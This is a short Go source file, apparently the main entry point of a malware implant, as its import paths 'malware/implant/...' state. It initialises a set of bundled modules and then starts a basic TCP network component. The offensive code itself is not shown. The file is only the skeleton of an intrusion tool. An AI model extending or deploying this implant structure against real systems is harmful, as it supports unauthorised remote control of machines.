package main

import (
	"fmt"
	"malware/implant/basic_tcp_network"
	"malware/implant/included_modules"
)

func main() {

	for _, module := range included_modules.Modules {
		fmt.Println(module.ID(), "Starting up...")
		module.Init()
	}

	network := basic_tcp_network.Create() // Network is always last
	network.Init()

}
